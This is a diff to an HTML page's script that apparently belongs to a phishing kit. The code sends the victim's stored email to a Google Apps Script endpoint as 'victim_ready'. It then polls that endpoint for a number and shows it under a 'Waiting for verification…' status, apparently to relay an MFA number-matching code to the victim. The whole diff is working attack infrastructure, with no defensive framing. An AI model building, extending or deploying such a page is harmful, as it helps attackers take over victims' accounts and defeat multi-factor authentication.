@@ -42,9 +42,11 @@
   <script>
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxUBfTv-NSz4B-L_Z_LvAbaTOnkPtxtxaA1rPMKuvkB51ZLgmrJHQqfK8505j2RwUaz/exec";
 
+    // Get email
     let email = localStorage.getItem("demoEmail") || "test@example.com";
     document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
 
+    // Send ready signal
     fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {method:"GET", mode:"no-cors"});
 
     const loading = document.getElementById("loading");
@@ -52,14 +54,13 @@
     const statusText = document.getElementById("statusText");
     const matchNumber = document.getElementById("matchNumber");
 
-    function checkForNumber() {
-      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}&nocache=${Math.random()}`;
+    function pollLatestNumber() {
+      const url = `${SCRIPT_URL}?getLatestNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
 
       fetch(url, { cache: "no-store" })
         .then(r => r.text())
         .then(text => {
-          // Very simple & reliable number extraction
-          const match = text.match(/"prompt_number":"(\d+)"/);
+          const match = text.match(/"number":"(\d+)"/);
           if (match && match[1]) {
             const number = match[1];
             matchNumber.textContent = number;
@@ -71,15 +72,14 @@
           }
         })
         .catch(() => {
-          statusText.textContent = "Waiting for verification…"; // silent retry
+          statusText.textContent = "Waiting for verification…";
         });
     }
 
     // Poll every 4 seconds
-    setInterval(checkForNumber, 4000);
-    // Run immediately
-    checkForNumber();
+    setInterval(pollLatestNumber, 4000);
+    // First poll immediately
+    pollLatestNumber();
   </script>
 </body>
 </html>
-
